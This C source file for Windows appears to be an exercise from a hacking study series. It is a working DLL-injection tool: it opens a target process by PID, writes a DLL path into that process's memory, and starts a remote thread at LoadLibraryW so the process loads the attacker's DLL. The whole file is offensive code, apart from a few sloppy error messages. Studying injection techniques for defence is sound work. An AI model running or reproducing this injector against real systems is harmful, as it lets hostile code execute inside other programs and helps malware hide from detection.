#include <stdio.h>
#include <windows.h>

DWORD PID, TID  = NULL;
HANDLE hProcess, hThread = NULL;
HMODULE hKernel32 = NULL;
wchar_t DLLPath[MAX_PATH] = L"300days-of-hacking\\Topic41\\outputfile.dll";
size_t DLLsize = sizeof(DLLPath);
LPVOID rBuffer = NULL;

int main(int argc, char** argv) {

    if (argc != 2) {
        printf("%s usage: %s 1",argv[0], PID);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("starting by opening process with %ld PID", PID);

    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        PID );

    if (!hProcess) {
        printf("starting by opening process with %ld PID", GetLastError());
        return EXIT_FAILURE;
    }


     rBuffer = VirtualAllocEx(hProcess, NULL, DLLsize, 
                            (MEM_COMMIT|MEM_RESERVE), PAGE_READWRITE);



    WriteProcessMemory(hProcess, rBuffer, DLLPath, DLLsize, NULL);

    hKernel32 = GetModuleHandleW(L"Kernel32");

    if (hKernel32 == NULL) {
        CloseHandle(hProcess);
    }

    LPTHREAD_START_ROUTINE startThread = (LPTHREAD_START_ROUTINE) GetProcAddress(hKernel32, "LoadLibraryW");

    hThread =  CreateRemoteThread(hProcess, NULL,  0, startThread, rBuffer, 0, &TID);

    if (!hThread) {
        CloseHandle(hProcess);
        return  EXIT_FAILURE;
    }

    CloseHandle(hProcess);

    WaitForSingleObject(hThread, INFINITE);
   

    return EXIT_SUCCESS;
}